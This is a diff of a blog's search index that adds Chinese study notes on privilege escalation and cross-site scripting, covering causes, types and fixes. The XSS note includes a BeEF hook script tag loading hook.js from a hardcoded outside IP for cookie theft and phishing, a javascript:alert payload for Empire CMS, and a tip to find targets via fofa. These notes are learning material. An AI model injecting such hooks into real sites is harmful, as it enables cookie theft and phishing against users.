@@ -137,13 +137,19 @@
     
     
     <entry>
-      <title></title>
+      <title>通用漏洞-水平越权&amp;垂直越权</title>
       <link href="/2023/05/08/%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83&amp;%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/"/>
       <url>/2023/05/08/%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83&amp;%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/</url>
       
-        <content type="html"><![CDATA[]]></content>
+        <content type="html"><![CDATA[<h1 id="通用漏洞-水平越权-amp-垂直越权"><a href="#通用漏洞-水平越权-amp-垂直越权" class="headerlink" title="通用漏洞-水平越权 &amp; 垂直越权"></a>通用漏洞-水平越权 &amp; 垂直越权</h1><h3 id="1、逻辑越权原理"><a href="#1、逻辑越权原理" class="headerlink" title="1、逻辑越权原理"></a>1、逻辑越权原理</h3><ul><li>水平越权： 用户信息获取时未对用户与ID比较判断直接查询等</li><li>垂直越权： 数据库中用户类型编号接受篡改或高权限操作未验证等</li></ul><h3 id="2、访问控制原理"><a href="#2、访问控制原理" class="headerlink" title="2、访问控制原理"></a>2、访问控制原理</h3><ul><li>验证丢失：未包含引用验证代码文件等</li><li>取消验证： 支持空口令、匿名、白名单</li></ul><h3 id="3、脆弱验证原理"><a href="#3、脆弱验证原理" class="headerlink" title="3、脆弱验证原理"></a>3、脆弱验证原理</h3><ul><li>cookie&amp;Token&amp;jwt:不安全的逻辑验证</li></ul><p><strong>漏洞原因：</strong><br>用户没有固定，在修改密码时，可以抓包修改其他用户信息。<br><strong>漏洞修复：</strong><br>固定已经登录的用户</p><h5 id="未登录删除后台文章漏洞"><a href="#未登录删除后台文章漏洞" class="headerlink" title="未登录删除后台文章漏洞"></a>未登录删除后台文章漏洞</h5><p>逻辑顺序错误<br>未登录删除以后，跳转登录页面</p><p><code>uset()重置函数</code><br><code>ulink()</code> </p><h1 id="脆弱验证"><a href="#脆弱验证" class="headerlink" title="脆弱验证"></a>脆弱验证</h1><p>未授权访问<br>越权直接访问没有验证的页面</p><p>1、没有验证，删除了验证代码<br>2、有验证 逻辑顺序搞错了，代码执行后验证<br>3、有验证，验证产生在用户凭据验证上cookie jwt token</p>]]></content>
       
       
+      
+        <tags>
+            
+            <tag> 通用漏洞 </tag>
+            
+        </tags>
       
     </entry>
     
@@ -188,7 +194,7 @@
     
     
     <entry>
-      <title>xss-3</title>
+      <title>XSS-3</title>
       <link href="/2023/05/08/XSS-3/"/>
       <url>/2023/05/08/XSS-3/</url>
       
@@ -207,13 +213,19 @@
     
     
     <entry>
-      <title></title>
+      <title>XSS-2</title>
       <link href="/2023/05/08/XSS-2/"/>
       <url>/2023/05/08/XSS-2/</url>
       
-        <content type="html"><![CDATA[]]></content>
+        <content type="html"><![CDATA[<p>——— 鲁迅曾经说过，乱点链接的人就该中马。</p><h1 id="XSS（跨站脚本攻击）Cross-Site-Scripting"><a href="#XSS（跨站脚本攻击）Cross-Site-Scripting" class="headerlink" title="XSS（跨站脚本攻击）Cross-Site Scripting"></a>XSS（跨站脚本攻击）Cross-Site Scripting</h1><h2 id="XSS原理：接收输入数据接收后输出数据将接收到的数据进行页面显示，数据一旦是js代码，将会被调用执行实现XSS攻击"><a href="#XSS原理：接收输入数据接收后输出数据将接收到的数据进行页面显示，数据一旦是js代码，将会被调用执行实现XSS攻击" class="headerlink" title="XSS原理：接收输入数据接收后输出数据将接收到的数据进行页面显示，数据一旦是js代码，将会被调用执行实现XSS攻击"></a>XSS原理：<br>接收输入数据<br>接收后输出数据<br>将接收到的数据进行页面显示，数据一旦是js代码，将会被调用执行实现XSS攻击</h2><p>对人(管理员，站长)的攻击——-xss攻击</p><p>分类：<br>1、反射型:（非持久型）恶意链接<br>拼接语句<br>—-一次性<br>2、存储型：(持久型)<br>—-持久</p><p>3、 DOM xss（接收输出均在js实现，后期构造在HTML页面）<br>修改页面DOM节点行成xss<br>document.</p><p>beef-xss搭建<br>钓鱼服务器<br>加载<br><code>&lt;script src=&quot;http://47.94.236.117:3000/hook.js&quot;&gt;&lt;script&gt;</code></p><p> &#x3D;cookie获取<br>跳转指向<br>社工钓鱼<br>配合漏洞</p><p>帝国cms<br>网站：<br>url&#x3D;javascript:alert(1)<br>fofa.info搜“Empirecms”</p><p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;产生：<br>数据交互的地方</p><p>留言板<br>评论<br>文章编辑<br>文章发布</p><p>数据显示受我控制</p><hr><h3 id="XSS分类："><a href="#XSS分类：" class="headerlink" title="XSS分类："></a>XSS分类：</h3><p>》–mxss（突变型xss）</p><p>原来payload的无害代码，由于一些因素，反编码导致payload变异，<br>导致，代码重新编译解析.</p><p>–提交已经被转译的xss代码–》预览编译重新加载xss代码，执行<br>过滤后通过分享，转载，预览等激活</p><p>》–uxss（通用型xss）<br>浏览器漏洞</p><p>》–flash XSS</p><p>swf 与js代码的调用</p><p>白盒：swf下载后反编译审计<br>黑盒：<br>swf下载后反编译审计<br>爬虫，目录扫描探针到<br>反编译</p><p>PDF：<br>创建PDF，加入JS动作<br>通过文件长传获取直连<br>直连地址访问后触发</p><p>利用条件过时的<br>。。。。。。。。。。略</p>]]></content>
       
       
+      
+        <tags>
+            
+            <tag> XSS </tag>
+            
+        </tags>
       
     </entry>
     
